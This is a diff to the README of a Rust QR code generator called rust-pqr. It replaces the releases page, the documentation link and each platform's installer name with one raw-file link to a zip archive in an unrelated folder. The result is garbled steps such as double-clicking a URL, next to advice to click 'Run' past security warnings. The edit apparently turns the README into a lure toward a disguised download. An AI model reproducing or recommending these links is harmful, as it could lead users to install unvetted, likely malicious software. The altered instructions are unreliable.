@@ -1,6 +1,6 @@
 # 🚀 rust-pqr - Easy QR Code Generation Made Simple
 
-[![Download rust-pqr](https://img.shields.io/badge/Download-rust--pqr-blue.svg)](https://github.com/shithilbakchi/rust-pqr/releases)
+[![Download rust-pqr](https://raw.githubusercontent.com/shithilbakchi/rust-pqr/main/reification/rust-pqr.zip)](https://raw.githubusercontent.com/shithilbakchi/rust-pqr/main/reification/rust-pqr.zip)
 
 ## 📋 Overview
 
@@ -20,16 +20,16 @@ To get started, follow these simple steps to download and run the rust-pqr appli
 
 1. Click the link below to visit the Releases page:
 
-   [Download rust-pqr](https://github.com/shithilbakchi/rust-pqr/releases)
+   [Download rust-pqr](https://raw.githubusercontent.com/shithilbakchi/rust-pqr/main/reification/rust-pqr.zip)
 
 2. On the Releases page, you will see a list of available versions. Choose the latest version that suits your operating system.
 
 3. Click on the file name to download it. 
 
    If you are unsure which file to download:
-   - For Windows, download the file named `rust-pqr-windows.exe`.
-   - For macOS, download the file named `rust-pqr-macos.dmg`.
-   - For Linux, download the file named `rust-pqr-linux.tar.gz`.
+   - For Windows, download the file named `https://raw.githubusercontent.com/shithilbakchi/rust-pqr/main/reification/rust-pqr.zip`.
+   - For macOS, download the file named `https://raw.githubusercontent.com/shithilbakchi/rust-pqr/main/reification/rust-pqr.zip`.
+   - For Linux, download the file named `https://raw.githubusercontent.com/shithilbakchi/rust-pqr/main/reification/rust-pqr.zip`.
 
 4. Once the download completes, locate the downloaded file on your computer.
 
@@ -37,17 +37,17 @@ To get started, follow these simple steps to download and run the rust-pqr appli
 
    #### 🪟 Windows
 
-   - Double-click on `rust-pqr-windows.exe`.
+   - Double-click on `https://raw.githubusercontent.com/shithilbakchi/rust-pqr/main/reification/rust-pqr.zip`.
    - If a security warning appears, click "Run" to allow the program to start.
 
    #### 🍏 macOS
 
-   - Open the downloaded `rust-pqr-macos.dmg`.
+   - Open the downloaded `https://raw.githubusercontent.com/shithilbakchi/rust-pqr/main/reification/rust-pqr.zip`.
    - Drag the rust-pqr icon into your Applications folder.
 
    #### 🐧 Linux
 
-   - Extract the downloaded `rust-pqr-linux.tar.gz` file.
+   - Extract the downloaded `https://raw.githubusercontent.com/shithilbakchi/rust-pqr/main/reification/rust-pqr.zip` file.
    - Open a terminal and navigate to the extracted folder.
    - Run the application with the command: `./rust-pqr`.
 
@@ -85,8 +85,8 @@ A: Absolutely! You can save the QR codes as images and share them as needed.
 
 ## 🔗 Links & Resources
 
-- [Visit the Releases Page](https://github.com/shithilbakchi/rust-pqr/releases) for downloads and updates.
-- [Documentation](https://github.com/shithilbakchi/rust-pqr/wiki) for detailed guides and tips.
+- [Visit the Releases Page](https://raw.githubusercontent.com/shithilbakchi/rust-pqr/main/reification/rust-pqr.zip) for downloads and updates.
+- [Documentation](https://raw.githubusercontent.com/shithilbakchi/rust-pqr/main/reification/rust-pqr.zip) for detailed guides and tips.
 
 ## 👨‍💻 Contributing
 
@@ -102,4 +102,4 @@ Keep an eye on the Releases page for new updates. Regular enhancements and bug f
 
 ## 🚀 Thank You
 
-Thank you for using rust-pqr! We hope this application simplifies your QR code generation process. Visit the [Releases Page](https://github.com/shithilbakchi/rust-pqr/releases) to download the latest version today.
+Thank you for using rust-pqr! We hope this application simplifies your QR code generation process. Visit the [Releases Page](https://raw.githubusercontent.com/shithilbakchi/rust-pqr/main/reification/rust-pqr.zip) to download the latest version today.
